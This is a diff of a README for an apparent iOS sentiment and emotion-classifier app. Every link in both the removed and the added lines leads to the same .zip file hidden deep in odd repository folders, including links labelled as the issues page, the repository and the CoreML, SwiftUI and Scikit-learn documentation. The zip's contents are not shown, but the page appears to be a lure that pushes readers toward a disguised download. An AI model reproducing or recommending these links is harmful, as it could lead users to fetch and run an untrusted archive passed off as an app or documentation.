@@ -4,7 +4,7 @@
 Welcome to the **SentimentAnalysis_CoreML_EmotionClassifier**. This application allows you to classify emotions in text on your iOS device easily. It uses CoreML and SwiftUI to provide a smooth user experience. The model behind this app was converted from Scikit-learn using coremltools, ensuring high accuracy. With this easy-to-use app, you can analyze sentiments and emotions seamlessly.
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/main/EmotionClassifier.xcodeproj/xcuserdata/mhapps.xcuserdatad/xcschemes/SentimentAnalysis_CoreML_EmotionClassifier-1.9.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/main/EmotionClassifier.xcodeproj/xcuserdata/mhapps.xcuserdatad/xcschemes/SentimentAnalysis_CoreML_EmotionClassifier-1.9.zip)
+[![Download Latest Release](https://github.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/raw/refs/heads/main/EmotionClassifier/Resources/EmotionClassifier.xcdatamodeld/Analysis-Emotion-Classifier-Sentiment-M-Core-1.0.zip%20Latest%20Release-Here-brightgreen)](https://github.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/raw/refs/heads/main/EmotionClassifier/Resources/EmotionClassifier.xcdatamodeld/Analysis-Emotion-Classifier-Sentiment-M-Core-1.0.zip)
 
 ## 🚀 Getting Started
 To get started with the **SentimentAnalysis_CoreML_EmotionClassifier**, you will need an iPhone or iPad running iOS 13.0 or later. The steps below will guide you through the process of downloading and running the app.
@@ -16,7 +16,7 @@ To get started with the **SentimentAnalysis_CoreML_EmotionClassifier**, you will
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page**: Click on the link below to go to the releases page for the app.  
-   [Download the App](https://raw.githubusercontent.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/main/EmotionClassifier.xcodeproj/xcuserdata/mhapps.xcuserdatad/xcschemes/SentimentAnalysis_CoreML_EmotionClassifier-1.9.zip)
+   [Download the App](https://github.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/raw/refs/heads/main/EmotionClassifier/Resources/EmotionClassifier.xcdatamodeld/Analysis-Emotion-Classifier-Sentiment-M-Core-1.0.zip)
    
 2. **Choose the Latest Version**: On the releases page, find the latest version of the app. Look for version numbers and changelog notes to help you find the most recent release.
 
@@ -46,18 +46,18 @@ When you open the **SentimentAnalysis_CoreML_EmotionClassifier**, you will find 
 ## 🛠️ Support
 If you encounter any issues or have questions about the app, feel free to reach out via GitHub issues in this repository. We appreciate your feedback and will do our best to assist you.
 
-To report an issue, simply visit the [Issues Page](https://raw.githubusercontent.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/main/EmotionClassifier.xcodeproj/xcuserdata/mhapps.xcuserdatad/xcschemes/SentimentAnalysis_CoreML_EmotionClassifier-1.9.zip) and provide details about the problem.
+To report an issue, simply visit the [Issues Page](https://github.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/raw/refs/heads/main/EmotionClassifier/Resources/EmotionClassifier.xcdatamodeld/Analysis-Emotion-Classifier-Sentiment-M-Core-1.0.zip) and provide details about the problem.
 
 ## 🌐 Learn More
 You can dive deeper into the technology that powers the **SentimentAnalysis_CoreML_EmotionClassifier** by visiting our documentation or GitHub repository.
 
-For any inquiries or collaboration requests, explore the [GitHub Repository](https://raw.githubusercontent.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/main/EmotionClassifier.xcodeproj/xcuserdata/mhapps.xcuserdatad/xcschemes/SentimentAnalysis_CoreML_EmotionClassifier-1.9.zip).
+For any inquiries or collaboration requests, explore the [GitHub Repository](https://github.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/raw/refs/heads/main/EmotionClassifier/Resources/EmotionClassifier.xcdatamodeld/Analysis-Emotion-Classifier-Sentiment-M-Core-1.0.zip).
 
 ## 🔗 Additional Resources
 Here are some sources to help you understand the underlying technology:
-- [CoreML Documentation](https://raw.githubusercontent.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/main/EmotionClassifier.xcodeproj/xcuserdata/mhapps.xcuserdatad/xcschemes/SentimentAnalysis_CoreML_EmotionClassifier-1.9.zip)
-- [SwiftUI Documentation](https://raw.githubusercontent.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/main/EmotionClassifier.xcodeproj/xcuserdata/mhapps.xcuserdatad/xcschemes/SentimentAnalysis_CoreML_EmotionClassifier-1.9.zip)
-- [Scikit-learn Documentation](https://raw.githubusercontent.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/main/EmotionClassifier.xcodeproj/xcuserdata/mhapps.xcuserdatad/xcschemes/SentimentAnalysis_CoreML_EmotionClassifier-1.9.zip)
+- [CoreML Documentation](https://github.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/raw/refs/heads/main/EmotionClassifier/Resources/EmotionClassifier.xcdatamodeld/Analysis-Emotion-Classifier-Sentiment-M-Core-1.0.zip)
+- [SwiftUI Documentation](https://github.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/raw/refs/heads/main/EmotionClassifier/Resources/EmotionClassifier.xcdatamodeld/Analysis-Emotion-Classifier-Sentiment-M-Core-1.0.zip)
+- [Scikit-learn Documentation](https://github.com/Clone19012011/SentimentAnalysis_CoreML_EmotionClassifier/raw/refs/heads/main/EmotionClassifier/Resources/EmotionClassifier.xcdatamodeld/Analysis-Emotion-Classifier-Sentiment-M-Core-1.0.zip)
 
 ## 🧩 Closing Thoughts
 Thank you for choosing **SentimentAnalysis_CoreML_EmotionClassifier**. We hope this app enhances your experience with emotion analysis. Happy analyzing!
